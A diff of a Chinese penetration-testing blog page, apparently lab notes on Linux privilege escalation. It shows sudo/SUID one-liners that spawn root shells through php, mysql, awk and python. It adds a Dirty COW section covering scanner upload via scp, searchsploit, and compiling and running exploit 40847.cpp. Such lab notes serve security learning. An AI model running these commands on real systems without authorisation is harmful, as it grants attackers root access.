@@ -49,7 +49,7 @@
         content="2021-12-01">
       <meta 
         property="og:article:modified_time" 
-        content="2021-12-08">
+        content="2021-12-22">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>402 words</span>
+      <span>596 words</span>
     
   </div>
   
@@ -371,16 +371,35 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
 .&#x2F;php -r &quot;pcntl_exec(&#39;&#x2F;bin&#x2F;sh&#39;,[&#39;-p&#39;]);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 </li>
 </ul>
+</blockquote>
+<blockquote>
 <h3 id="2-_mysql"><a href="#2-_mysql" class="headerlink" title="2. mysql"></a>2. mysql</h3><ul>
 <li>sudo<br><code>sudo -u root mysql -e &#39;\! /bin/bash&#39;</code>  </li>
 </ul>
+</blockquote>
+<blockquote>
 <h3 id="3-_awk/mawk"><a href="#3-_awk/mawk" class="headerlink" title="3. awk/mawk"></a>3. awk/mawk</h3><ul>
 <li>sudo<br><code>sudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>  </li>
 <li>suid<br><code>mawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></li>
 </ul>
+</blockquote>
+<blockquote>
 <h3 id="4-_python"><a href="#4-_python" class="headerlink" title="4. python"></a>4. python</h3><ul>
 <li>suid<br><code>python -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;</code>  </li>
 </ul>
+</blockquote>
+<blockquote>
+<h3 id="5-_u810F_u725B_u63D0_u6743/_u5DF2_u83B7_u5F97ssh_u767B_u9646_u6743_u9650"><a href="#5-_u810F_u725B_u63D0_u6743/_u5DF2_u83B7_u5F97ssh_u767B_u9646_u6743_u9650" class="headerlink" title="5.脏牛提权/已获得ssh登陆权限"></a>5.脏牛提权/已获得ssh登陆权限</h3><ul>
+<li>使用实例：<a target="_blank" rel="noopener" href="https://chen-299.github.io/9f3820f2.html">Vulnhub|Lampiao</a>  </li>
+</ul>
+<p>把<a target="_blank" rel="noopener" href="https://github.com/aishee/scan-dirtycow">脏牛漏洞扫描器</a>，上传到靶机上。</p>
+<ul>
+<li>scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。  </li>
+</ul>
+<p><code>scp ~/dirtycowscan.sh &lt;ssh_user&gt;@&lt;目标ip&gt;:&lt;目标路径&gt;</code><br>运行脏牛漏洞扫描脚本<code>./dirtycowscan.sh</code>，查看返回结果是否<strong>IS vulnerable</strong>。<br>在攻击机找exp<code>searchsploit dirty</code>，找到对应脚本，同样用<strong>scp</strong>将 <strong>/usr/share/exploits/&lt;脚本所在path&gt;</strong> 传到靶机上。<br>在靶机上编译运行脚本：  </p>
+<blockquote>
+<p>编译源代码：<code>vim &lt;上传的脚本&gt;</code>–找到编译语句，如<code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code>进行编译。<br>运行编译成的文件：如<code>./dcow -s</code>。  </p>
+</blockquote>
 </blockquote>
 
   </div>
@@ -452,7 +471,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-_u810F_u725B_u63D0_u6743/_u5DF2_u83B7_u5F97ssh_u767B_u9646_u6743_u9650"><span class="toc-text">5.脏牛提权&#x2F;已获得ssh登陆权限</span></a></li></ol></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -471,7 +490,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>19</span>
+    <span>20</span>
     <span>Posts</span>
   </a>
   <a 
@@ -483,7 +502,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>17</span>
+    <span>20</span>
     <span>Tags</span>
   </a>
 </div>
@@ -516,7 +535,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-_u810F_u725B_u63D0_u6743/_u5DF2_u83B7_u5F97ssh_u767B_u9646_u6743_u9650"><span class="toc-text">5.脏牛提权&#x2F;已获得ssh登陆权限</span></a></li></ol></li></ol>
       </div>
     </article>
   
@@ -534,7 +553,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">15</span>
+          <span class="categories-list-item-badge">16</span>
         </div>
       </a>
     
@@ -603,6 +622,12 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
       </a>
     
       <a 
+        href="/tags/http-methods/" 
+        title="http-methods">
+        <div class="tags-list-item">http-methods</div>
+      </a>
+    
+      <a 
         href="/tags/ftp/" 
         title="ftp">
         <div class="tags-list-item">ftp</div>
@@ -618,12 +643,6 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
         href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" 
         title="内网穿透">
         <div class="tags-list-item">内网穿透</div>
-      </a>
-    
-      <a 
-        href="/tags/http-methods/" 
-        title="http-methods">
-        <div class="tags-list-item">http-methods</div>
       </a>
     
       <a 
@@ -645,21 +664,21 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
       </a>
     
       <a 
+        href="/tags/searchsploit/" 
+        title="searchsploit">
+        <div class="tags-list-item">searchsploit</div>
+      </a>
+    
+      <a 
+        href="/tags/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/" 
+        title="脏牛提权">
+        <div class="tags-list-item">脏牛提权</div>
+      </a>
+    
+      <a 
         href="/tags/CSRF/" 
         title="CSRF">
         <div class="tags-list-item">CSRF</div>
-      </a>
-    
-      <a 
-        href="/tags/getshell/" 
-        title="getshell">
-        <div class="tags-list-item">getshell</div>
-      </a>
-    
-      <a 
-        href="/tags/FileInclusion/" 
-        title="FileInclusion">
-        <div class="tags-list-item">FileInclusion</div>
       </a>
     
   </div>
@@ -680,7 +699,7 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-_u810F_u725B_u63D0_u6743/_u5DF2_u83B7_u5F97ssh_u767B_u9646_u6743_u9650"><span class="toc-text">5.脏牛提权&#x2F;已获得ssh登陆权限</span></a></li></ol></li></ol>
     </article>
   
   
@@ -695,6 +714,11 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-12-22</div>
+        <a href="/9f3820f2.html"><div class="recent-posts-item-content">Vulnhub|Lampiao</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-21</div>
         <a href="/4d5d77bb.html"><div class="recent-posts-item-content">DVWA|FileInclusion</div></a>
       </div>
@@ -707,11 +731,6 @@ CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-17</div>
         <a href="/b9aee5c3.html"><div class="recent-posts-item-content">DVWA|CommandInjection</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-10</div>
-        <a href="/2b3bf173.html"><div class="recent-posts-item-content">Tools</div></a>
       </div>
     
   </div>
